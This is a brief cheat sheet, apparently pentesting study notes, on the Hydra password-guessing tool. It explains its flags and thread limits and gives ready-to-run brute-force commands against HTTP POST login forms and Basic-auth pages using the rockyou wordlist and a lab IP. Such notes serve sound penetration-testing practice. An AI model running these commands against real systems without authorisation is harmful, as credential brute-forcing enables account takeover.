# Hydra

Example:

``` 
hydra -l <username> -P <wordlist path> <protocol>://<ip>
```

```-l``` : for one username
```-L``` : for a file of usernames. (ex: user.txt)
```-p``` : for one password
```-P``` : for a list of passwords (wordlists)

thread limit

```-T1``` : limits to one thread. Use for:
- RDP
- SSH
- SMB
- winRM

HTTP are usually fine with high threads.

```-I``` : ignore previous sessions

## HTTP

Login POST request form

```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.103.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Login GET Basic auth

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.103.201 http-get /
```